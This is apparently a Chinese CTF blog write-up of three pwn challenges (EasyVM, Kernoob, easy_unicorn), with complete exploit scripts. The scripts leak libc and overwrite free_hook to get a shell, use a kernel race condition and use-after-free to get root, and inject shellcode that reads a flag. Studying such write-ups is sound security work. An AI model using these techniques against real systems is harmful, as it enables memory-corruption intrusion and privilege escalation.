---
title: 公益CTF
date: 2020-03-09 11:26:49
tags: PWN
---

这两天打了这个,做了几道pwn

# EasyVM

一个自定义指令集的VM,逆向可以发现几个功能,分别是输入字节码,执行字节码,gift和退出

保护全开,不能写got表.gift给了一个leak,可以直接算出地址,这里梳理出流程直接用z3解了,在字节码中,可以看到getchar和putchar没有检测下标啊,任意地址读写了

直接读malloc的got表,然后leak libcbase,后面直接写free hook为system,然后将R0和R1寄存器写上字符串,触发free

```
from z3 import *
from pwn import *

#context.log_level="debug"

def decode(enc):
        print "%x"%enc
        R1 = BitVec('R1',32)
        S = Solver()

        R6 = R1
        R1 >>= 0xD
        R1 ^= R6
        R6 = R1
        R1 <<= 9
        R1 &= 0X78F39600
        R1 ^= R6
        R6 = R1
        R1 <<= 0x11
        R1 &= 0X85D40000
        R1 ^= R6
        R6 = R1
        R1 >>= 0X13
        R1 ^= R6

        S.add(R1 == enc)

        if S.check() == sat:
                R1 = BitVec('R1',32)
                return S.model()[R1].as_long()
        else:
                return 0;

#r = process("./EasyVM.bak")
r = remote("121.36.215.224",9999)

def sa(a,b):
        r.sendlineafter(a,b)

sa(">>> ","4")
sa(">>> ","2")
r.recvline()
start =  decode(int(r.recvline(10),16))

if (start & 0xfff) == 0x6c0:
        log.success("[*] start:0x%x"%start)
        malloc_got = start + 0x290c
        opcode = chr(0x80) + chr(3) + p32(malloc_got) # MOV R3 mallocgot
        opcode += chr(0x53) + chr(0xff) # putchar R3
        opcode += chr(0x80) + chr(3) + p32(malloc_got + 1) # MOV R3 mallocgot + 1
        opcode += chr(0x53) + chr(0xff) # putchar R3
        opcode += chr(0x80) + chr(3) + p32(malloc_got + 2) # MOV R3 mallocgot + 2
        opcode += chr(0x53) + chr(0xff) # putchar R3
        opcode += chr(0x80) + chr(3) + p32(malloc_got + 3) # MOV R3 mallocgot + 3
        opcode += chr(0x53) + chr(0xff) # putchar R3
        opcode += chr(0x99)
        sa(">>> ","1")
        #raw_input()
        r.sendline(opcode)

        sa(">>> ","2")
        print r.recv()
        malloc_addr = u32(r.recv(1) + r.recv(1) + r.recv(1) + r.recv(1))
        log.success("[*] malloc_addr:0x%x"%malloc_addr);
        libc_addr = malloc_addr - 0x70f00
        log.success("[*] libc_addr:0x%x"%libc_addr);

        free_hook =  0x1b38b0 + libc_addr

        opcode = chr(0x80) + chr(3) + p32(free_hook)
        opcode += chr(0x54) + chr(0xff)
        opcode += chr(0x80) + chr(3) + p32(free_hook + 1)
        opcode += chr(0x54) + chr(0xff)
        opcode += chr(0x80) + chr(3) + p32(free_hook + 2)
        opcode += chr(0x54) + chr(0xff)
        opcode += chr(0x80) + chr(3) + p32(free_hook + 3)
        opcode += chr(0x54) + chr(0xff)
        opcode += chr(0x80) + chr(0) + p32(u32("/bin"))
        opcode += chr(0x80) + chr(1) + p32(u32("/sh\x00"))
        opcode += chr(0x99)

        sa(">>> ","1")
        r.sendline(opcode)

        sa(">>> ","2")
        r.send(p32(libc_addr + 0x3ada0))

        r.interactive()
        #print r.recv().encode("hex")
else:
        exit(0)
```

# Kernoob

一个内核pwn,可以看到有一个基本堆题的功能,但是限制了size,kfree存在一个UAF,但是大小不够cred的

 cpio -idmv < test.cpio解包,进到init.d改一下启动文件,方便调试

 find ./* | cpio -H newc -o > test.cpio 写回cpio.

/proc/modules 找基址 调试

add-symbol-file ~/Desktop/noob.ko 0xffffffffc0002000

发现断下来后也没啥用...后来发现这玩意申请了两个core,考虑一下double fetch,但是好像打不通啊....概率太低了,等一个wp

```
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <assert.h>
#include <unistd.h>
#include <pthread.h>

int fd1,fd2;

struct node
{
	uint64_t index;
	uint64_t data_ptr;
	uint64_t size;
};

int new(int fd,struct node * n)
{
	return ioctl(fd,0x30000,n);
}

int del(int fd,uint64_t index)
{
	struct node n;
	n.index = index;
	n.size = 0;
	n.data_ptr = NULL;
	return ioctl(fd,0x30001,&n);
}

int  edit(int fd,uint64_t index,uint64_t ptr,uint64_t size)
{
	struct node n;
	n.index = index;
	n.size = size;
	n.data_ptr = ptr;
	return ioctl(fd,0x30002,&n);
}

int  show(int fd,uint64_t index,uint64_t ptr,uint64_t size)
{
	struct node n;
	n.index = index;
	n.size = size;
	n.data_ptr = ptr;
	return ioctl(fd,0x30003,&n);
}

int finish = 0;
void changesize(void * ptr)
{
	struct node * p = (struct node *)ptr;

	while(!finish)
	{
		p->size = 0xa8;
	}
}


char  buf[0x100] = {0};

int main()
{
	pthread_t t1,t2;
	fd1 = open("/dev/noob",O_RDWR);
	fd2 = open("/dev/noob",O_RDWR);
	assert(fd1 >= 0);
	assert(fd2 >= 0);
	puts("[*]race condition");
	struct node n;
        n.index = 0;
        n.size = 0x68;
        n.data_ptr = 0;

	pthread_create(&t1, NULL,changesize,&n);

	for (int i=0;i<0x20;i++) {
		n.size = 0x68;
		n.index = i;
		if(new(fd1,&n) == -1)
		{
			i -= 1;
		}
   	}
   	finish = 1;
   	pthread_join(t1, NULL);

	memset(buf,0x41,0xa8);
	for(int i=0;i < 0x20;i++)
	{
		if(edit(fd1,0,buf,0xa8) != -1)
		{
			printf("GET IT:%d\n",i);
		}
		else
		{
			printf("GG\n");
		}
	}
	
	del(fd1,0);
	
	puts("[*]fork");
   	int pid = fork();
   	if (pid < 0) {
      		printf("[-]fork error!!\n");
      		exit(-1);
   	} 
	else if (pid == 0) 
	{
		char buf[28];
      		memset(buf,0,28);
      		edit(fd2,0,buf,28);
      		if (getuid() == 0) 
		{
         		printf("[+]rooted!!\n");
         		system("/bin/sh");
      		}
   	} 	
   	else 
   	{
      		wait(NULL);
   	}
	return ;
}
```

# easy_unicorn

用unicorn跑了一个程序,要我们pwn这个文件,总体实现还是可以理解的,但是卡在了恢复文件的过程中,赛后复现的时候,发现其实并没有想的那么难,题目提供了一个dump文件,文件中记录着一个程序在运行时所有的段,然后利用unicorn把他加再进去.

题目逻辑就是先将passwd加密,然后打印在屏幕上,需要进行逆向

然后输入程序,发现后面没有输入点了,这时继续分析主函数,发现一个函数指针的调用,这里是在一个结构体里面的vtable指针,结构体指针在栈里

```
p
*p = vtable
call *(*p + 8)
```

在函数前部,可以看到一个给vtable赋值的地方,分别是赋值0x401920然后用0x401900盖住,看到相应的位置,可以看到,其实这里是两组vtable,然后只有后面那组才有输入功能,这里需要改vtable的值,最后看到在输入失败的时候1,会有一个*a++的操作,也就是指针加,但是输入失败的时候,在while循环中,会检查输入的字节,累计字节不能超过4,所以只能发送空内容,这样就能绕过这个检测

不知道为什么本地打不起来...,open文件总是出问题

实现原理就是给syscall添加hook,在每次调用到syscall时,由sandbox处理,例如open,则sandbox会从寄存器读出寄存器以及字符串值,然后代替打开文件,返回文件描述符,继续运行



exp:

```
from pwn import *

context.arch = "amd64"

r = remote("121.37.167.199",9998)
#r = process("./x86_sandbox")
key = "062f392d417574680083100500080000"

for i in range(0x20):
    r.sendlineafter(" << ","")

r.sendlineafter(" << ",key)
#r.sendlineafter("]","n")
r.recvuntil("data ptr:")
p = int(r.recvline(),16)
print hex(p)

shellcode = shellcraft.open("flag.txt")
shellcode += shellcraft.read(3,0x603080,0x20)
shellcode += shellcraft.write(1,0x603080,0x20)

r.sendlineafter("<<",asm(shellcode))
r.sendlineafter("<<",str(p))
r.sendlineafter("<<",str(p))
r.sendlineafter("<<",str(p))
r.sendlineafter("<<",str(p))
r.interactive()
```

